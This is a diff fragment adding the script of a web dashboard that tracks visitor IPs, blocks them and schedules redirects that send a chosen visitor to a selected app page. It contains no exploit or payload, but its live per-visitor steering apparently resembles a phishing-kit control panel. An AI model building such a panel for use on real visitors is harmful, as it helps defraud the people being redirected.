+                return path.indexOf('NqX4Rk7VuLfGc2WdTbH8') !== -1;
+            }
+
+            function buildModalPages() {
+                var box = document.getElementById('modal-pages');
+                box.innerHTML = (APP_PAGES || []).map(function (p) {
+                    var invalid = isInvalidPage(p.path);
+                    return '<button type="button" class="page-option' + (invalid ? ' invalid' : '') + '" data-path="' + esc(p.path) + '">' +
+                        '<span class="p-ico"><i class="fa-solid ' + pageIcon(p.path) + '"></i></span>' +
+                        '<span class="p-label">' + esc(p.label) + '</span>' +
+                        '<i class="fa-solid fa-check checked-ico"></i>' +
+                    '</button>';
+                }).join('');
+            }
+
+            function openModal(ip) {
+                modalIp = ip;
+                selectedPage = null;
+                document.getElementById('modal-ip').textContent = ip;
+                buildModalPages();
+                modalOverlay.classList.add('open');
+                modalOverlay.setAttribute('aria-hidden', 'false');
+                updateSendState();
+            }
+
+            function closeModal() {
+                modalOverlay.classList.remove('open');
+                modalOverlay.setAttribute('aria-hidden', 'true');
+            }
+
+            function updateSendState() {
+                var send = document.getElementById('modal-send');
+                send.disabled = !selectedPage;
+                send.style.opacity = selectedPage ? '1' : '.6';
+                send.style.cursor = selectedPage ? 'pointer' : 'not-allowed';
+            }
+
+            function scheduleUserRedirect(ip, target) {
+                fetch(USERREDIRECT_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip: ip, target: target })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (res) {
+                        if (res.OK) {
+                            toast('Redirect scheduled for ' + ip);
+                            closeModal();
+                        } else {
+                            toast(res.message || 'Error scheduling redirect', true);
+                        }
+                    })
+                    .catch(function () { toast('Connection error', true); });
+            }
+            document.getElementById('users-body').addEventListener('click', function (e) {
+                var btn = e.target.closest('button[data-ip]');
+                if (!btn || !btn.getAttribute('data-ip')) return;
+                if (btn.getAttribute('data-action') === 'redirect') {
+                    openModal(btn.getAttribute('data-ip'));
+                } else {
+                    setBlocked(btn.getAttribute('data-ip'), btn.getAttribute('data-type'));
+                }
+            });
+
+            // Modal: select a destination page
+            document.getElementById('modal-pages').addEventListener('click', function (e) {
+                var opt = e.target.closest('.page-option');
+                if (!opt) return;
+                selectedPage = opt.getAttribute('data-path');
+                var opts = this.querySelectorAll('.page-option');
+                for (var i = 0; i < opts.length; i++) {
+                    opts[i].classList.toggle('selected', opts[i] === opt);
+                }
+                updateSendState();
+            });
+
+            // Modal: confirm send
+            document.getElementById('modal-send').addEventListener('click', function () {
+                if (!modalIp || !selectedPage) return;
+                scheduleUserRedirect(modalIp, selectedPage);
+            });
+
+            // Modal: close buttons and overlay click
+            document.getElementById('modal-close').addEventListener('click', closeModal);
+            document.getElementById('modal-cancel').addEventListener('click', closeModal);
+            modalOverlay.addEventListener('click', function (e) {
+                if (e.target === modalOverlay) closeModal();
+            });
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape') closeModal();
+            });
+
+            document.getElementById('blocked-list').addEventListener('click', function (e) {
+                var btn = e.target.closest('button[data-ip]');
+                if (btn) setBlocked(btn.getAttribute('data-ip'), btn.getAttribute('data-type'));
+            });
+
+            document.getElementById('block-form').addEventListener('submit', function (e) {
+                e.preventDefault();
+                var input = document.getElementById('block-ip');
+                var ip = input.value.trim();
+                if (!ip) return;
+                input.value = '';
+                setBlocked(ip, 'block');
+            });
+
+            document.getElementById('redirect-form').addEventListener('submit', function (e) {
+                e.preventDefault();
+                var input = document.getElementById('redirect-url');
+                var url = input.value.trim();
+                if (!url) return;
+                saveRedirectUrl(url);
+            });
+
+            document.getElementById('refresh-btn').addEventListener('click', function () {
+                var btn = this;
+                btn.classList.remove('spinning');
+                void btn.offsetWidth;
+                btn.classList.add('spinning');
+                loadStats();
+            });
+
+            // Live clock
+            setInterval(function () {
+                document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US');
+            }, 1000);
+
+            // ---------- Boot ----------
+            loadStats();
+            loadRedirectUrl();
+            setInterval(loadStats, POLL_MS);
+        })();
+    </script>
+</body>
+</html>
